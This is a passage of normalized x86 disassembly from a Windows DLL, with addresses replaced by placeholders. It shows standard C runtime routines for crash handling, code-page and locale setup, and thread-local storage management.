mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_10017d06
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_10017d06
pop ecx
sub_1000f088
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_1000f0b7
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_1000ebe0
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_1000f11b
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_10017ec8
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_10017a8b
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_10017a8b
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1000c176
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_1000ebe0
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_1000f2ae
push 0xc
push r--data
call sub_10011e54
call sub_1000fd57
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_1001135a
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000f349
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_10011e99
retn
push 0x20
call sub_1000e69f
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_1000c3e9
pop ecx
sub_1000f352
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_1000c185
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1000f3ce
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_1000f352
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_1000f0b7
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_1000ebe0
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c176
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_1000f088
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_1000f11b
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_1000ebe0
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_1000f088
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_1000f5b3
push 0x14
push r--data
call sub_10011e54
or [ ebp - 0x20 ] 0xffffffff
call sub_1000fd57
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_1000f2ae
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_1000f352
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_10015982
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_10011e99
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_1000f3ce
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_1001034f
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_1000c3e9
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_1000c3e9
pop ecx
push 0xd
call sub_1001135a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000f714
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_1000c3e9
pop ecx
sub_1000f76b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_1000c3e9
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_1000c3e9
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_1000c3e9
push [ esi + 0xc0 ]
call sub_1000c3e9
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_10017f0a
push [ edi ]
call sub_1000c3e9
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_1000c3e9
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_1000c3e9
pop ecx
push [ esi + 0xb0 ]
call sub_1000c3e9
push [ esi + 0xbc ]
call sub_1000c3e9
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_1000c3e9
push [ esi + 0xbc ]
call sub_100180e4
pop ecx
pop ecx
push eax
call sub_1000c3e9
pop ecx
push eax
call sub_1000c3e9
push [ esi + 0xbc ]
call sub_1001809f
pop ecx
pop ecx
sub_1000f8b4
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_1000f943
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_1000f9dc
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_1000f8b4
pop ecx
test esi esi
je r-xdata
push esi
call sub_1000f943
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_1000f76b
pop ecx
sub_1000fa1a
push 0xc
push r--data
call sub_10011e54
call sub_1000fd57
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_1001135a
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_1000f9dc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000fa84
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_1000fd57
mov esi [ eax + 0x6c ]
mov eax esi
call sub_10011e99
retn
push 0x20
call sub_1000e69f
pop ecx
sub_1000fa90
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_1000e66f
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_1000fb0b
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_1000e66f
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_1000fb86
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call sub_1000fb0b
pop ecx
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_1000fbba
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_1000fb0b
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp sub_10011229
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_1000fbf7
push 0xc
push r--data
call sub_10011e54
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
push esi
call sub_1000e66f
pop ecx
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_1001135a
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000fccc
push 0xc
call sub_1001135a
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_1000f8b4
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000fcd5
call sub_10011e99
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_1000fcde
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_1000fb86
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_100159c7
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_1000fb0b
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_1000c3e9
pop ecx
xor esi esi
push 0x0
push esi
call sub_1000fbf7
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_1000fd71
push 0x8
push r--data
call sub_10011e54
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10011e99
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_1000c3e9
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_1000c3e9
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_1000c3e9
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_1000c3e9
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_1000c3e9
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_1000c3e9
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_1000c3e9
pop ecx
push 0xd
call sub_1001135a
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_1000c3e9
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000fe8b
push 0xc
call sub_1001135a
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000fe97
push esi
call sub_1000c3e9
pop ecx
push edi
call sub_1000f943
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_1000c3e9
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_1000f76b
pop ecx
sub_1000fea0
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call sub_1000fb0b
pop ecx
call eax
push [ ebp + 0x8 ]
call sub_1000fd71
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_1000ff0e
mov edi edi
push esi
push edi
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push esi
call sub_1000e66f
pop ecx
call sub_1000fbba
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_1000fb7d
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_1000e94a
push [ rw-data ]
call sub_1000fa90
push [ rw-data ]
mov [ rw-data ] eax
call sub_1000fa90
push [ rw-data ]
mov [ rw-data ] eax
call sub_1000fa90
push [ rw-data ]
mov [ rw-data ] eax
call sub_1000fa90
add esp 0x10
mov [ rw-data ] eax
call sub_100111de
test eax eax
je r-xdata
test eax eax
jne r-xdata
push sub_1000fd71
push [ rw-data ]
call sub_1000fb0b
pop ecx
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_100159c7
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_1000fb0b
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_1000fbf7
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn
sub_1001009b
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_1000c185
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_1001034f
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_100183c0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_1001840b
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_10017a8b
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_100101bf
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x328 ] 0x0
push ebx
push 0x4c
lea eax [ ebp - 0x324 ]
push 0x0
push eax
call sub_1000ebe0
lea eax [ ebp - 0x328 ]
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x2d4 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x20c ] ecx
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x328 ] 0xc0000417
mov [ ebp - 0x324 ] 0x1
mov [ ebp - 0x31c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc0000417
call [ GetCurrentProcess@IAT ]
push eax
